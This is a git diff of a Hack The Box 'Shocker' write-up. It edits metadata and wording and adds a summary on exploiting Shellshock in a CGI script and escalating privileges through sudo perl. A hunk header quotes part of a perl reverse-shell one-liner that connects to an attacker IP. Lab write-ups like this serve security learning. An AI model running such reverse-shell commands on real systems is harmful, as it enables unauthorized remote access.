@@ -1,11 +1,9 @@
 ---
 layout: single
 title: "HTB - Shocker"
-last_modified_at: 2021-04-14 01:00:00 -0700
+last_modified_at: 2021-07-01 01:00:00 -0700
 categories: writeups
 tags: [HTB]
-image:
-  feature:
 share: true
 date: 2021-02-07 01:00:00 -0700
 toc: true
@@ -13,7 +11,7 @@ toc_label: "Table of Contents"
 classes: wide
 ---
 # HTB - Shocker
-![Shocker picture](/assets/images/writeups/shocker.png)
+![Shocker picture](/assets/images/writeups/shocker.png){: .align-center}
 
 **IP**: 10.129.97.115 \
 **Completed on**: February 7, 2021 \
@@ -22,6 +20,9 @@ classes: wide
 
 **Note!** Added shocker IP to /etc/hosts as `shocker shocker.htb`
 {: .notice--success}
+
+## Summary
+The shocker Hack The Box machine shows how severe a shellshock vulnerability can be. After enumeration, a bash script hosted within /cgi/ directory can be identified which is vulnerable to shellshock. Using curl I sent payloads to verify vulnerability and granted me user level access. Privilege escalation was done through permissions misconfiguration with perl binary, since user was allowed to run it as root without a password.
 
 ## Enumeration
 
@@ -97,4 +98,4 @@ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.69";$p=7001;socket(S,PF_INET,SOCK
 
 That’s it! Although this box was easier, it goes to show how severe ShellShock vulnerability was during 2014-2018. 
 
-According to Security Intelligence's August 2020 [article](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/) it's still relevant in 2020 considering there is a large number of vulnerable servers. The article points to Politico's January 2020 [news article](https://www.politico.com/news/2020/01/16/georgia-election-systems-could-have-been-hacked-before-2016-vote-100334) which reported that Georgia election systems was still vulnerable to ShellShock.
+According to Security Intelligence's August 2020 [article](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/) it's still relevant in 2020 considering there is numerous vulnerable servers. The article points to Politico's January 2020 [news article](https://www.politico.com/news/2020/01/16/georgia-election-systems-could-have-been-hacked-before-2016-vote-100334) which reported that Georgia election systems was still vulnerable to ShellShock.
